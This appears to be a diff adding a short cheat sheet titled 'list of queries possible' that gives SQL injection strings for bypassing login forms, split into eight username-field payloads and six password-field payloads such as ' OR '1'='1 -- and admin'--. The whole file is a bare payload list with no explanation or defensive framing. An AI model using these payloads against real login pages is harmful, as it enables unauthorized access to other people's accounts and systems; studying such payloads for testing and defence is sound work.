@@ -1,0 +1,22 @@
+LIST OF QUERIES POSSIBLE
+
+LOGIN BYPASS 
+
+Username bypass
+1. ' OR '1'='1 --
+2. admin' OR '1'='1 --
+3. ' OR 'a'='a' -- 
+4. ' OR '1'='1' OR 'a'='a
+5. ' OR 1=1-- 
+6. admin'-- (any valid username followed by '--)
+7. admin' OR '1'='1' OR 'x'='x --
+8. admin' OR 1=1 OR 2=2 --
+
+Password bypass (With valid existing usernames only)
+1. ' OR '1'='1' --
+2. anything' OR '1'='1' --
+3. ' OR 1=1 --
+4. ' OR '1'='1
+5. ' OR 'a'='a 
+6. ' OR NOT 'x'='y --
+
